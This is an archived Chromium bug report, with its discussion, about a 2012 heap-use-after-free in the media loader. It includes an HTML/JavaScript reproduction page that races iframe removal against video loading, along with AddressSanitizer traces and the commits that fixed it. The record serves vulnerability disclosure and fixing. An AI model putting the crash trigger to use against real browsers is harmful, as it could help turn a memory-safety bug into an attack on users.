# Heap-use-after-free in webkit_media::BufferedResourceLoader::Start

| Field | Value |
|-------|-------|
| **Issue ID** | [40053364](https://issues.chromium.org/issues/40053364) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Internals, Internals>Media |
| **Reporter** | mi...@gmail.com |
| **Assignee** | sc...@chromium.org |
| **Created** | 2012-02-06 |
| **Bounty** | $1,000.00 |

## Description

**VULNERABILITY DETAILS**  

use-after-free with iframe and video, http schema required

**VERSION**  

Chrome Version: stable, beta, dev

Chromium 19.0.1031.0 (Developer Build 120523)  

OS Linux  

WebKit 535.20 (@106668)

Operating System: linux 64bit

**REPRODUCTION CASE**  

http schema required, video file can be any file. test.ogv is from the repo.

<html>
<head>
<script>
setTimeout("window.location.reload()", 100)
function loadstart()
{
var video = document.getElementsByTagName('video')[0]
var newVideo = video.cloneNode(true)
var iframeDocument = document.getElementById("iframe").contentDocument
iframeDocument.body.appendChild(newVideo)
}
function start()
{
var video = document.getElementsByTagName('video')[0]
video.addEventListener("loadstart", loadstart)
setTimeout(test,Math.random()\\*10)
}
function test()
{
document.body.removeChild(document.getElementsByTagName("iframe")[0])
}
</script>
</head>
<body>
<iframe id="iframe"></iframe>
<video src="test.ogv"></video>
<script>start()</script>
</body>
</html>

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

Type of crash: renderer  

Crash State:

==16089== ERROR: AddressSanitizer heap-use-after-free on address 0x7fffe619c880 at pc 0x55555bd07c64 bp 0x7fffffff9bb0 sp 0x7fffffff9ba8  

READ of size 8 at 0x7fffe619c880 thread T0  

#0 0x55555bd07c64 in webkit\_media::BufferedResourceLoader::Start(base::Callback<void (int)> const&, base::Callback<void ()> const&, WebKit::WebFrame\*) ???:0  

#1 0x55555bd04921 in webkit\_media::BufferedDataSource::RestartLoadingTask() ???:0  

#2 0x555557ad1df6 in MessageLoop::RunTask(base::PendingTask const&) ???:0

0x7fffe619c880 is located 0 bytes inside of 424-byte region [0x7fffe619c880,0x7fffe619ca28)  

freed by thread T0 here:  

#0 0x55555d999e62 in free ??:0  

#1 0x55555a512835 in WebCore::FrameLoader::~FrameLoader() ???:0  

#2 0x55555a656b1a in WebCore::Frame::~Frame() ???:0

previously allocated by thread T0 here:  

#0 0x55555d999f22 in malloc ??:0  

#1 0x5555593e421b in WTF::fastMalloc(unsigned long) ???:0  

#2 0x5555592cc656 in WebKit::WebFrameImpl::createChildFrame(WebCore::FrameLoadRequest const&, WebCore::HTMLFrameOwnerElement\*) ???:0  

#3 0x555559365c11 in WebKit::FrameLoaderClientImpl::createFrame(WebCore::KURL const&, WTF::String const&,

## Attachments

- [video-bug.html](attachments/video-bug.html) (text/html; charset=us-ascii, 821 B)
- [video-bug-beta.txt](attachments/video-bug-beta.txt) (text/x-c; charset=us-ascii, 7.8 KB)
- [video-bug-stable.txt](attachments/video-bug-stable.txt) (text/x-c; charset=us-ascii, 7.8 KB)
- [test.ogv](attachments/test.ogv) (application/ogg; charset=binary, 101.3 KB)
- [video-bug.txt](attachments/video-bug.txt) (text/x-c; charset=us-ascii, 8.1 KB)

## Timeline

### in...@chromium.org (2012-02-06)

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=18903852

Uploader: inferno@chromium.org

Crash Type: Heap-use-after-free READ 8
Crash Address: 0x7f4a96751480
Crash State:
  - crash stack -
  webkit_media::BufferedResourceLoader::Start
  webkit_media::BufferedDataSource::RestartLoadingTask
  - free stack -
  WebCore::FrameLoader::~FrameLoader
  WebCore::Frame::~Frame
  
Regressed: https://cluster-fuzz.appspot.com/revisions?range=118326:118466

Minimized Testcase (96.86 Kb): https://cluster-fuzz.appspot.com/download/AMIfv95SayK6xWdnkZuxZq49VioG9PEJC0EPGonHamBFhmJ4N-bV6VoRLU2IkcRSg_SkaR341vQKuDEww7_NXUnAlGBuuyyOoYmhMawqeK_R8N2qkXhqtPJs_AGlyTRzeGUppG1ZRtIP1VBv3tqpL3iqbVeYMg05RA

Additional requirements: Requires HTTP

### in...@chromium.org (2012-02-06)

Andrew, it seems to be coming off from either http://src.chromium.org/viewvc/chrome?view=rev&revision=118338 or http://src.chromium.org/viewvc/chrome?view=rev&revision=118386. can you please check out this use of stale frame.


### sc...@chromium.org (2012-02-06)

will take a peek

### sc...@gmail.com (2012-02-07)

Seems like a M18 security regression. If humanly possible Andrew, we'd love to ensure this security regression doesn't make it all the way out to M18 stable.

### sc...@chromium.org (2012-02-07)

yeah not a surprise -- I've been hacking in this area

looks like we're doing something silly inside of a dtor

### sc...@chromium.org (2012-02-09)

Hmm I actually get a different ASAN crash:


    #0 0x7fc332bddcb2 in WebURL /usr/local/google/scherkus/chrome/src/./third_party/WebKit/Source/WebKit/chromium/public/platform/../../../../Platform/chromium/public/WebCString.h:60
    #1 0x7fc332bda911 in ~Callback /usr/local/google/scherkus/chrome/src/./base/callback_forward.h:12
    #2 0x7fc32ee0eb36 in base::Callback<void ()()>::Run() const /usr/local/google/scherkus/chrome/src/./base/callback.h:272
    #3 0x7fc32ee0f398 in MessageLoop::DeferOrRunPendingTask(base::PendingTask const&) /usr/local/google/scherkus/chrome/src/base/message_loop.cc:470
    #4 0x7fc32ee10689 in MessageLoop::DoWork() /usr/local/google/scherkus/chrome/src/base/message_loop.cc:660
    #5 0x7fc32ee1b1b7 in base::MessagePumpDefault::Run(base::MessagePump::Delegate*) /usr/local/google/scherkus/chrome/src/base/message_pump_default.cc:28
    #6 0x7fc32ee0d6ce in MessageLoop::RunInternal() /usr/local/google/scherkus/chrome/src/base/message_loop.cc:418
    #7 0x7fc32ee0b8bf in ~AutoRunState /usr/local/google/scherkus/chrome/src/base/message_loop.cc:745
    #8 0x7fc33368e64c in RendererMain(content::MainFunctionParams const&) /usr/local/google/scherkus/chrome/src/content/renderer/renderer_main.cc:241
    #9 0x7fc32ed670a8 in RunZygote /usr/local/google/scherkus/chrome/src/content/app/content_main.cc:233
    #10 0x7fc32ed66502 in content::ContentMain(int, char const**, content::ContentMainDelegate*) /usr/local/google/scherkus/chrome/src/content/app/content_main.cc:457
    #11 0x7fc32d4d44a7 in ChromeMain /usr/local/google/scherkus/chrome/src/chrome/app/chrome_main.cc:32
    #12 0x7fc32d4d43fb in main /usr/local/google/scherkus/chrome/src/chrome/app/chrome_exe_main_gtk.cc:18
    #13 0x7fc326862c4d in __libc_start_main /build/buildd/eglibc-2.11.1/csu/libc-start.c:258



Still looks related to WebFrame being deallocated

### sc...@chromium.org (2012-02-09)

blarg I think this is a case where WebKit reports didFail w/ an error code of 0, which we think is net::OK and continue on thinking things are all good

In a way I'm glad this crash came up because I noticed this earlier and filed https://crbug.com/chromium/110120 as a result

### sc...@chromium.org (2012-02-09)

looks like a simple fix is possible w/o involving https://crbug.com/chromium/110120! phew!

https://chromiumcodereview.appspot.com/9375005/

### bu...@chromium.org (2012-02-09)

The following revision refers to this bug:
    http://src.chromium.org/viewvc/chrome?view=rev&revision=121274

------------------------------------------------------------------------
r121274 | scherkus@chromium.org | Thu Feb 09 11:55:40 PST 2012

Changed paths:
 M http://src.chromium.org/viewvc/chrome/trunk/src/webkit/media/buffered_resource_loader_unittest.cc?r1=121274&r2=121273&pathrev=121274
 M http://src.chromium.org/viewvc/chrome/trunk/src/webkit/media/buffered_resource_loader.cc?r1=121274&r2=121273&pathrev=121274

Return net::ERR_FAILED when BufferedResourceLoader::didFail() is called.

The documentation of BufferedResourceLoader's start/read callbacks states that it'll return only a tiny subset of the many error codes listed under net/base/net_error_list.h

It's possible to receive an error code of 0 for didFail() that maps neatly to net::OK. The end result is we trick callees into thinking the operation succeeded when, in fact, it did not.

This is a short term fix for https://crbug.com/chromium/112833 until we can replace our use of net::CompletionCallback (see https://crbug.com/chromium/110120).

BUG=112833

Review URL: https://chromiumcodereview.appspot.com/9375005
------------------------------------------------------------------------

### sc...@chromium.org (2012-02-09)

[Empty comment from Monorail migration]

### sc...@gmail.com (2012-02-09)

[Empty comment from Monorail migration]

### bu...@chromium.org (2012-02-10)

The following revision refers to this bug:
    http://src.chromium.org/viewvc/chrome?view=rev&revision=121356

------------------------------------------------------------------------
r121356 | cevans@chromium.org | Thu Feb 09 16:31:31 PST 2012

Changed paths:
 M http://src.chromium.org/viewvc/chrome/branches/1025/src/webkit/media/buffered_resource_loader.cc?r1=121356&r2=121355&pathrev=121356
 M http://src.chromium.org/viewvc/chrome/branches/1025/src/webkit/media/buffered_resource_loader_unittest.cc?r1=121356&r2=121355&pathrev=121356

Merge 121274 - Return net::ERR_FAILED when BufferedResourceLoader::didFail() is called.

The documentation of BufferedResourceLoader's start/read callbacks states that it'll return only a tiny subset of the many error codes listed under net/base/net_error_list.h

It's possible to receive an error code of 0 for didFail() that maps neatly to net::OK. The end result is we trick callees into thinking the operation succeeded when, in fact, it did not.

This is a short term fix for https://crbug.com/chromium/112833 until we can replace our use of net::CompletionCallback (see https://crbug.com/chromium/110120).

BUG=112833

Review URL: https://chromiumcodereview.appspot.com/9375005

TBR=scherkus@chromium.org
Review URL: https://chromiumcodereview.appspot.com/9372041
------------------------------------------------------------------------

### sc...@gmail.com (2012-02-10)

[Empty comment from Monorail migration]

### sc...@gmail.com (2012-02-11)

@miaubiz: we love regression catches :D
$1000

----
Boilerplate text:
Please do NOT publicly disclose details until a fix has been released to all our
users. Early public disclosure may cancel the provisional reward.
Also, please be considerate about disclosure when the bug affects a core library
that may be used by other products.
Please do NOT share this information with third parties who are not directly
involved in fixing the bug. Doing so may cancel the provisional reward.
Please be honest if you have already disclosed anything publicly or to third parties.
----

### al...@chromium.org (2012-02-14)

Unable to reproduce on ubuntu 10.04, gc: 19.0.1036.7 dev, no crash, but a lot of flickering. 

### sc...@gmail.com (2012-02-14)

For security bugs, can we leave the status as FixUnreleased? Helps us track things. Thanks!

### sc...@gmail.com (2012-03-28)

[Empty comment from Monorail migration]

### [Deleted User] (2012-05-15)

Marking old security bugs Fixed..

### al...@chromium.org (2012-05-16)

[Comment Deleted]

### bu...@chromium.org (2012-10-13)

This issue has been closed for some time. No one will pay attention to new comments.
If you are seeing this bug or have new data, please click New Issue to start a new bug.

### la...@google.com (2013-01-18)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-10)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-13)

[Empty comment from Monorail migration]

### sc...@gmail.com (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-01)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### is...@google.com (2016-10-02)

This issue was migrated from crbug.com/chromium/112833?no_tracker_redirect=1

[Multiple monorail components: Internals, Internals>Media]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40053364)*
